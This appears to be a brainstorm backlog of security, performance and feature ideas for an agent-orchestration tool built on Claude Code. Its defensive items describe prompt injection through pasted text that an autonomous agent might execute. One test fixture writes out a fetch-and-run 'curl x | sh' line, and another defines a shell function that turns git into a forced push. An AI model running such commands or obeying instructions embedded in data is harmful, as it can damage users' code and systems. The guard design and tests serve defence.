# Brainstorm — lens: unspoken needs

I looked past the earlier rounds and kept only what they don't already cover. Security and performance are thin, so most of these land there. Idea 5 is a hybrid of two earlier ideas, and idea 3 is a second-order measurement gap.

- **Judge commands against the user's real shell snapshot** — SECURITY — value 4 — effort M — risk med — category: guard
  Why: assumption: Claude Code's Bash tool sources a snapshot of the user's rc files (aliases, functions, PATH order, `BASH_ENV`). The guard (T-0275, the pipe-to-bash fix) judges the command text, but `rm` or `git` may not mean what the guard thinks.
  Done when: with a fixture rc defining `git(){ command git push --force "$@"; }`, the guard's verdict for `git status` carries the function's effects and the test fails if the snapshot is ignored.

- **Stamp provenance on captured tasks and pasted spans** — SECURITY — value 4 — effort M — risk low — category: intake
  Why: the pack's rules say text inside pasted blocks may carry instructions the user didn't write. Intake stores user messages verbatim as tasks (T-0755 to T-0760), and the drive then executes them in bypass mode. Assumption: `UserPromptSubmit` sees the paste boundaries. Tasks also get an authority class (user-said, derived, external) for tasks from Artifact comments or downstream friction.
  Done when: a captured task whose pasted stack trace contains "run `curl x | sh`" shows that span as data in the brief, and the drive does not run it. A task from an external source is not auto-executed.

- **Classify every unfamiliar native tool before it can run unattended** — SECURITY — value 4 — effort S — risk low — category: guard
  Why: the pack lists Artifact, RemoteTrigger, SendMessage and PushNotification as outward-facing and unused, and the tool list changes with each Claude Code release. Assumption: the guard is Bash-centric. Any tool not in a registry defaults to "egress" until someone classifies it.
  Done when: a fixture tool name absent from the registry is held with a one-line reason under autonomy=full. After a registry entry is added, it passes.

- **Gate hook latency on cold-start p99** — PERFORMANCE — value 3 — effort S — risk low — category: hooks
  Why: the gate is `bench_hooks.py --runs 20`, which measures warm runs. The first hook after a suspend or idle gap pays for a cold page cache and Python startup, and T-0744 shows load already distorts measurements. Assumption: cold latency is worse than warm.
  Done when: `bench_hooks.py --cold` drops caches (or uses a fresh copy of the tree) and the release gate fails on a stated p99 budget.

- **Tighten subagent tool allowlists from observed use** — SECURITY — value 3 — effort M — risk med — category: least-privilege
  Why: 482 subagent transcripts have been measured, so usage data exists. A scout or reviewer that never calls Write or WebFetch shouldn't carry them. Fewer tools also means a smaller schema per spawn. Run a shadow period that logs would-have-denied calls before enforcing.
  Done when: `fm agents audit` prints each role's used and unused tools over 30 days, and a role with a trimmed allowlist passes its bench with no would-have-denied hits.

- **Match open complaints to each new Claude Code release** — FEATURE — value 4 — effort M — risk low — category: native-integration
  Why: the user keeps saying "integrate better with new CC features" while open captures like T-0758 (idle) and T-0759 (step drift) sit unsolved. Join the tool-list and changelog diff to the open complaint list so a release says "X could fix T-0758" once.
  Done when: given a fixture release note mentioning Monitor, the SessionStart diff names T-0758 as a candidate and does not repeat after the user drops or accepts it.

- **Keep a last-green mirror checkout the user can run** — FEATURE — value 3 — effort M — risk low — category: lanes
  Why: assumption: while lanes edit, the user's dev server, tests or app launch break mid-change. A read-only worktree at the last gate-green tree hash, refreshed on `fm task finish`, lets them keep using the product.
  Done when: `fm mirror` prints a path whose HEAD tree matches the last green gate, and it does not move while a lane is mid-edit.

- **Bench native env knobs on the replay set** — PERFORMANCE — value 3 — effort M — risk low — category: tuning
  Why: assumption: Claude Code's `env` settings (bash output cap, timeouts, max output tokens, thinking budget) are untuned for Foreman's long gate logs. Treat each as an experiment with a before/after.
  Done when: a report shows tokens and wall-clock per knob setting on N replayed tasks, and only a setting that wins is shipped as a default.

- **Wild: Mask identity and paths when the screen is shared** — FEATURE — value 3 — effort S — risk low — category: privacy
  Why: wild. The user's `passmail` address suggests privacy awareness. When a screen-share or recorder process is detected, or `FM_STREAM=1` is set, the band, pane and statusline hide home paths, emails and token-shaped strings.
  Done when: a screenshot test with `FM_STREAM=1` contains none of a fixture email, home path or fake token.

- **Wild: Land a clean verified state at the predicted return time** — FEATURE — value 3 — effort M — risk med — category: autonomy
  Why: wild. Message cadence predicts when the user comes back. Foreman schedules slow gates and the close-out for just before then, so the user returns to a green tree and a one-line summary rather than a half-edited one.
  Done when: in a simulated session with a learned 6pm return, the final queued step is a gate that finishes before 6pm, and a summary is waiting.

- **Wild: Leave a placard in every lane worktree** — FEATURE — value 2 — effort S — risk low — category: delight
  Why: wild. Someone who `cd`s into an agent worktree has to guess why it exists. A short `.fm-lane` note (task, step, owner, how to adopt or discard) is a small touch that makes the fleet legible.
  Done when: each created worktree has the placard, `fm lane adopt` reads it, and the placard stays out of commits.
